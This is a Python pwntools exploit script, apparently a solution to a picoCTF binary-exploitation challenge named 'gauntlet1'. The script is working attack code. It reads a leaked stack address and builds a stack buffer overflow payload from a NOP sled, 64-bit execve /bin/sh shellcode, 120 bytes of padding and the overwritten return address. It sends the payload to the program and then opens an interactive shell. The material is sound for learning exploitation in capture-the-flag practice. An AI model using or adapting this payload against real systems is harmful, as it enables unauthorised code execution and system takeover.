from pwn import *

#Start the local program
l = process('./gauntlet1')

#Remote version - just need to uncomment and comment the local one out when needed
#l = remote('mercury.picoctf.net','32853')


#Initalize some NOPs
nop = b"\x90" * 12

#27 byte shellcode (64-bit)
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

#Get the address it spits out
address = l.recvline() 
#Strip the new line off
address = address.strip()
#Debug statement
log.info(f"Got address: {address}")

#Convert it to a hexadecimal number, as we're reading in bytes
rip = p64(int(address, 16))

#Initialise an empty exploit variable
exploit = b""
#Add the NOPs
exploit += nop
#Add the shellcode
exploit += shellcode
#Add junk to the length of 120 minus the length of the stuff we've already added
exploit += b"A" * (120 - len(exploit))
#Add the return address as the one it keeps giving us!
exploit += rip

#Send first expected input
l.sendline("test")
l.recvline()
#Send exploit
l.sendline(exploit)
#Drop into an interactive shell
l.interactive()
